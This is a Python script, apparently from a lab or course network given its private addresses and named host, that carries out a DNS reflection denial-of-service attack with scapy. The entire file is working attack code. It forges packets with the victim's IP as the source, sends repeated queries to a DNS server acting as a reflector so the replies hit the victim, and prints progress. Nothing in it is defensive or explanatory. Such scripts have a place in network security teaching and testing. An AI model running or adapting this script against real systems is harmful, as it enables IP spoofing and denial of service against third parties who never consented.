#!/usr/bin/env python3
"""
DNS reflected DoS attack.
Run from the ws3 host (10.1.0.3).
Spoofed source IP is the victim's IP, sent to a DNS reflector.
Usage: python3 attack_DNS_DDoS.py <victim_ip> <dns_server> [count]
Example: python3 attack_DNS_DDoS.py 10.1.0.2 10.12.0.20 1000
"""
import sys
from scapy.all import IP, UDP, DNS, DNSQR, send, conf
conf.verb = 0

def reflect(victim, dns_server, count):
    print(f"[*] Launching DNS reflection attack")
    print(f"    Spoofed source (victim): {victim}")
    print(f"    Reflector (DNS server):  {dns_server}")
    print(f"    Packets to send:         {count}")

    pkt = IP(src=victim, dst=dns_server) / UDP(sport=4444, dport=5353) / \
          DNS(rd=1, qd=DNSQR(qname="localhost", qtype="A"))

    for i in range(count):
        send(pkt, verbose=0)
        if (i + 1) % 100 == 0:
            print(f"    Sent {i + 1}/{count}")

    print(f"[*] Done. {count} spoofed queries sent.")
    print(f"[*] Check {victim} for unsolicited DNS replies.")

if __name__ == "__main__":
    victim = sys.argv[1]
    dns_server = sys.argv[2]
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
    reflect(victim, dns_server, count)

